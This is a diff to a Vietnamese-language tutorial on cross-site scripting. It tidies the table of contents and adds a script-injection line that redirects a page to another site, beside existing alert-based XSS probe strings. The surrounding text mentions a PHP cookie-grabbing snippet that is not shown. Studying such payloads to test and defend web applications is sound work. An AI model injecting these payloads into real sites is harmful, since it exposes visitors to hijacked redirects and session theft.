@@ -1,9 +1,9 @@
 # A3-Cross-Site Scripting (XSS)
 
-- **[ khái quát về xss](#1)
-- **[ các đoạn js truyền vào để check lỗi](#2)
-- **[ thực hành trên lab](#3)
-- **[ Cách tấn công và hạ gục 1 trang web bằng xss](#4)
+- ** [ khái quát về xss](#1)**
+- ** [ các đoạn js truyền vào để check lỗi](#2)**
+- **[ thực hành trên lab](#3)**
+- **[ Cách tấn công và hạ gục 1 trang web bằng xss](#4)**
 
 <a name="1"></a>
 ## khái quát
@@ -47,6 +47,9 @@ XSS được viết tắt bởi Cross-Site-Scripting. Nó là một phương ph�
 ";alert(String.fromCharCode(88,83,83))
 ';alert("XSS")
 ';alert(String.fromCharCode(88,83,83))
+
+câu lệnh chuyển tiếp
+<script>window.location.href = "http://www.trang-mới.com"</script>
 
 ```
  - đoạn PHP get cookie
